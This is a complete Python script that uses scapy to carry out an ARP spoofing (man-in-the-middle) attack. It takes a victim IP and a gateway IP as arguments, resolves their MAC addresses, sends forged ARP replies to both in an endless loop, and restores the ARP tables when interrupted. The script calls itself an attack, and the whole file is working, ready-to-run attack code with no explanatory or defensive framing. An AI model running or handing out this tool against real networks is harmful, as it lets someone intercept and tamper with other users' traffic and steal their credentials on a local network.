#!/usr/bin/env python3

import sys
from scapy.all import ARP, Ether, srp, send
import argparse
import ipaddress
import subprocess

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-ip", required=True, help="The victim IP")
    parser.add_argument("--gateway-ip", required=True, help="The router/gateway IP")
    return parser.parse_args()

def validate_ip(target_ip, gateway_ip):
    try:
        ipaddress.ip_address(target_ip)
        ipaddress.ip_address(gateway_ip)
        return True
    except ValueError:
        return False

def ping_addresses(ip):
        command = ['ping', '-c', '1', ip]
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode != 0:
            return False
        return True

def get_mac(ip):
    """Discovers the MAC address of a given IP address on the local network."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = srp(broadcast / arp_request, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def restore(destination_ip, source_ip): 
    """Restores the original ARP table mappings when exiting the script."""
    dst_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    if dst_mac and src_mac:
        packet = ARP(op=2, pdst=destination_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac)
        send(packet, count=4, verbose=False)

if __name__ == "__main__":
    args = parse_arguments()
    target_ip, gateway_ip = args.target_ip, args.gateway_ip

    print(f"[*] Starting ARP spoofing attack: Target {target_ip} | Gateway: {gateway_ip}")

    if not validate_ip(target_ip, gateway_ip):
        print("[-] Error: Invalid IP address format provided.")
        sys.exit(1)

    if not ping_addresses(target_ip):
        print("[-] Error: Target is unreachable via ping.")
        sys.exit(1)


    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[-] Could not resolve MAC addresses")
        sys.exit(1)

    poison_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    poison_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    
    packet_counter = 0

    print("[*] Press CTRL+C to stop and restore network state.")

    try:
        while True:
            send(poison_to_target, verbose=False)
            send(poison_to_gateway, verbose=False)
            packet_counter += 2
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C. Restoring arp tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print(f"[*] Total spoof packets sent: {packet_counter}")
        print("[+] Network restored. Exiting.")
